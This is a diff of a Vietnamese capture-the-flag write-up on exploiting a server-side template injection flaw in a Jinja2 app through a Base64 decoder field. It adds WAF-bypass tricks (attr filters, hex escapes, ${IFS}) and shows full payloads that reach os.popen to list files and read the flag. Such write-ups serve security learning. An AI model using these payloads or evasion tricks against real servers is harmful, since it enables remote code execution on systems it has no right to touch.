@@ -12,13 +12,20 @@ https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
 
 ---
 
-- Chúng ta phát hiện được rằng chương trình có lỗ hỏng SSTI khi truyền chuỗi Base64 `e3snYScudXBwZXJ9fQ==` ( {{'a'.upper}} ) vào Decoder field của chương trình.
+- Chúng ta phát hiện được rằng chương trình có lỗ hỏng SSTI khi truyển chuỗi Base64 `e3snYScudXBwZXJ9fQ==` ( {{'a'.upper}} ) vào Decoder field của chương trình.
 
 ![img](images/test_upper.png)
 
 ## SSTI exploit and bypass WAF
 
 ---
+- Dựa vào một số input để xác định được các kí tự bị filtered bởi WAF:
+> - '.' có thể bypass bằng |attr
+> - 'g' có thể bypass bằng \x67
+> - space có thể bypass bằng ${IFS}
+> - '-' có thể bypass bằng \x2d
+
+> Chú ý: Những payload dưới cần encode base64 trước rồi mới đưa vào phần decode.
 
 - Đầu tiên, Chúng ta sử dụng lệnh sau để hiển thị tất cả các class.
 
@@ -36,7 +43,7 @@ https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
 
 ![img](images/os_wrap_close.png)
 
-- Tiếp theo, ta sử dụng lệnh dưới đây để liệt kê tất cả các file có trong đường dẫn hiện tại.
+- Tiếp theo, ta gọi đến 1 module trong class `os._wrap_close` nhằm thực thi os command. Ở đây mình sẽ thử với `ls -la`
 
 ```
 {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__\x67etitem__')(132)|attr('__init__')|attr('__\x67lobals__')|attr('__\x67etitem__')('__builtins__')|attr('__\x67etitem__')('__import__')('os')|attr('popen')('ls${IFS}\x2dla')|attr('read')()}}
@@ -44,7 +51,7 @@ https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
 
 ![img](images/list_file.png)
 
-- Ta phát hiện có file flag. Cuối cùng, ta sử dụng lệnh sau để đọc được file flag trên.
+- Ta phát hiện có file flag. Cuối cùng, ta sử dụng payload sau để đọc được file flag trên.
 
 ```
 {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__\x67etitem__')(132)|attr('__init__')|attr('__\x67lobals__')|attr('__\x67etitem__')('__builtins__')|attr('__\x67etitem__')('__import__')('os')|attr('popen')('cat${IFS}fla\x67')|attr('read')()}}
